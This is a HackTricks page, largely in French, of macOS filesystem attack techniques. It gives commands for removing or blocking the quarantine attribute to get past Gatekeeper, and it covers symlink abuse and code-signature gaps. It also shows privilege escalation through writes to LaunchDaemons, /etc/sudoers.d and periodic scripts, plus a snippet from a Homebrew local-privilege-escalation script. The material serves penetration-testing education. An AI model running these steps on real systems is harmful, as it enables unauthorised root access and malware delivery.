# macOS FS Tricks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Combinaisons de permissions POSIX

Permissions dans un **répertoire** :

* **lecture** - vous pouvez **énumérer** les entrées du répertoire
* **écriture** - vous pouvez **supprimer/écrire** des **fichiers** dans le répertoire et vous pouvez **supprimer des dossiers vides**.
* Mais vous **ne pouvez pas supprimer/modifier des dossiers non vides** à moins d'avoir des permissions d'écriture dessus.
* Vous **ne pouvez pas modifier le nom d'un dossier** à moins de le posséder.
* **exécution** - vous êtes **autorisé à traverser** le répertoire - si vous n'avez pas ce droit, vous ne pouvez pas accéder à des fichiers à l'intérieur, ni dans des sous-répertoires.

### Combinaisons dangereuses

**Comment écraser un fichier/dossier appartenant à root**, mais :

* Un parent **propriétaire de répertoire** dans le chemin est l'utilisateur
* Un parent **propriétaire de répertoire** dans le chemin est un **groupe d'utilisateurs** avec **accès en écriture**
* Un **groupe d'utilisateurs** a un accès **en écriture** au **fichier**

Avec l'une des combinaisons précédentes, un attaquant pourrait **injecter** un **lien symbolique/lien dur** dans le chemin attendu pour obtenir une écriture arbitraire privilégiée.

### Cas spécial du dossier root R+X

S'il y a des fichiers dans un **répertoire** où **seul root a accès R+X**, ceux-ci **ne sont accessibles à personne d'autre**. Donc, une vulnérabilité permettant de **déplacer un fichier lisible par un utilisateur**, qui ne peut pas être lu à cause de cette **restriction**, de ce dossier **vers un autre**, pourrait être exploitée pour lire ces fichiers.

Exemple dans : [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Lien symbolique / Lien dur

Si un processus privilégié écrit des données dans un **fichier** qui pourrait être **contrôlé** par un **utilisateur de moindre privilège**, ou qui pourrait avoir été **précédemment créé** par un utilisateur de moindre privilège. L'utilisateur pourrait simplement **le pointer vers un autre fichier** via un lien symbolique ou un lien dur, et le processus privilégié écrira sur ce fichier.

Vérifiez dans les autres sections où un attaquant pourrait **abuser d'une écriture arbitraire pour élever les privilèges**.

## .fileloc

Les fichiers avec l'extension **`.fileloc`** peuvent pointer vers d'autres applications ou binaires, donc lorsqu'ils sont ouverts, l'application/binaire sera celui exécuté.\
Exemple :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## FD arbitraire

Si vous pouvez faire en sorte qu'un **processus ouvre un fichier ou un dossier avec des privilèges élevés**, vous pouvez abuser de **`crontab`** pour ouvrir un fichier dans `/etc/sudoers.d` avec **`EDITOR=exploit.py`**, de sorte que `exploit.py` obtienne le FD du fichier à l'intérieur de `/etc/sudoers` et en abuse.

Par exemple : [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Éviter les astuces xattrs de quarantaine

### Supprimer
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Si un fichier/dossier a cet attribut immuable, il ne sera pas possible d'y mettre un xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Un **devfs** mount **ne prend pas en charge xattr**, plus d'infos dans [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Cette ACL empêche d'ajouter des `xattrs` au fichier
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Le format de fichier **AppleDouble** copie un fichier y compris ses ACE.

Dans le [**code source**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), il est possible de voir que la représentation textuelle de l'ACL stockée à l'intérieur de l'xattr appelé **`com.apple.acl.text`** va être définie comme ACL dans le fichier décompressé. Donc, si vous avez compressé une application dans un fichier zip avec le format de fichier **AppleDouble** avec une ACL qui empêche d'autres xattrs d'y être écrits... l'xattr de quarantaine n'a pas été défini dans l'application :

Consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) pour plus d'informations.

Pour reproduire cela, nous devons d'abord obtenir la chaîne acl correcte :
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Notez que même si cela fonctionne, le sandbox écrit l'attribut xattr de quarantaine avant)

Pas vraiment nécessaire mais je le laisse là juste au cas où :

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Contourner les signatures de code

Les bundles contiennent le fichier **`_CodeSignature/CodeResources`** qui contient le **hash** de chaque **fichier** dans le **bundle**. Notez que le hash de CodeResources est également **intégré dans l'exécutable**, donc nous ne pouvons pas y toucher non plus.

Cependant, il existe certains fichiers dont la signature ne sera pas vérifiée, ceux-ci ont la clé omit dans le plist, comme :
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Il est possible de calculer la signature d'une ressource depuis le cli avec : 

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Monter des dmgs

Un utilisateur peut monter un dmg personnalisé créé même par-dessus certains dossiers existants. C'est ainsi que vous pourriez créer un paquet dmg personnalisé avec un contenu personnalisé :

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Habituellement, macOS monte le disque en communiquant avec le service Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fourni par `/usr/libexec/diskarbitrationd`). Si vous ajoutez le paramètre `-d` au fichier plist des LaunchDaemons et redémarrez, il stockera des journaux dans `/var/log/diskarbitrationd.log`.\
Cependant, il est possible d'utiliser des outils comme `hdik` et `hdiutil` pour communiquer directement avec le kext `com.apple.driver.DiskImages`.

## Écritures arbitraires

### Scripts sh périodiques

Si votre script peut être interprété comme un **script shell**, vous pourriez écraser le **`/etc/periodic/daily/999.local`** script shell qui sera déclenché chaque jour.

Vous pouvez **falsifier** une exécution de ce script avec : **`sudo periodic daily`**

### Daemons

Écrivez un **LaunchDaemon** arbitraire comme **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** avec un plist exécutant un script arbitraire comme :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers File

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH files

Le fichier **`/etc/paths`** est l'un des principaux endroits qui remplit la variable d'environnement PATH. Vous devez être root pour l'écraser, mais si un script d'un **processus privilégié** exécute une **commande sans le chemin complet**, vous pourriez être en mesure de **détourner** cela en modifiant ce fichier.

Vous pouvez également écrire des fichiers dans **`/etc/paths.d`** pour charger de nouveaux dossiers dans la variable d'environnement `PATH`.

## Generate writable files as other users

Cela générera un fichier qui appartient à root et qui est modifiable par moi ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Cela pourrait également fonctionner comme privesc :
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Shared Memory

**La mémoire partagée POSIX** permet aux processus dans des systèmes d'exploitation conformes à POSIX d'accéder à une zone de mémoire commune, facilitant une communication plus rapide par rapport à d'autres méthodes de communication inter-processus. Cela implique de créer ou d'ouvrir un objet de mémoire partagée avec `shm_open()`, de définir sa taille avec `ftruncate()`, et de le mapper dans l'espace d'adresses du processus en utilisant `mmap()`. Les processus peuvent ensuite lire et écrire directement dans cette zone de mémoire. Pour gérer l'accès concurrent et prévenir la corruption des données, des mécanismes de synchronisation tels que des mutex ou des sémaphores sont souvent utilisés. Enfin, les processus désaffichent et ferment la mémoire partagée avec `munmap()` et `close()`, et éventuellement suppriment l'objet de mémoire avec `shm_unlink()`. Ce système est particulièrement efficace pour un IPC rapide et efficace dans des environnements où plusieurs processus doivent accéder rapidement à des données partagées.

<details>

<summary>Exemple de code du producteur</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Exemple de code consommateur</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Descripteurs protégés macOS

**Les descripteurs protégés macOS** sont une fonctionnalité de sécurité introduite dans macOS pour améliorer la sécurité et la fiabilité des **opérations de descripteur de fichier** dans les applications utilisateur. Ces descripteurs protégés fournissent un moyen d'associer des restrictions spécifiques ou des "gardes" avec des descripteurs de fichier, qui sont appliquées par le noyau.

Cette fonctionnalité est particulièrement utile pour prévenir certaines classes de vulnérabilités de sécurité telles que **l'accès non autorisé aux fichiers** ou **les conditions de concurrence**. Ces vulnérabilités se produisent par exemple lorsqu'un thread accède à une description de fichier donnant **à un autre thread vulnérable un accès dessus** ou lorsqu'un descripteur de fichier est **hérité** par un processus enfant vulnérable. Certaines fonctions liées à cette fonctionnalité sont :

* `guarded_open_np`: Ouvre un FD avec une garde
* `guarded_close_np`: Ferme-le
* `change_fdguard_np`: Change les drapeaux de garde sur un descripteur (même en supprimant la protection de garde)

## Références

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
